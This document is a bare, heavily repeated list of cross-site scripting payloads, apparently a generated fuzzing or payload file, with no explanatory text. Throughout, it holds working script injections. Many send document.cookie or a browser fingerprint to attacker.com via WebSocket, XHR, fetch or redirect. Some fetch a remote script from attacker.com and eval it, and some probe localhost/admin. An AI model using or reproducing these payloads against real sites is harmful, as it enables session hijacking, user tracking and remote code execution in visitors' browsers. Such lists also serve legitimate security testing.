<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
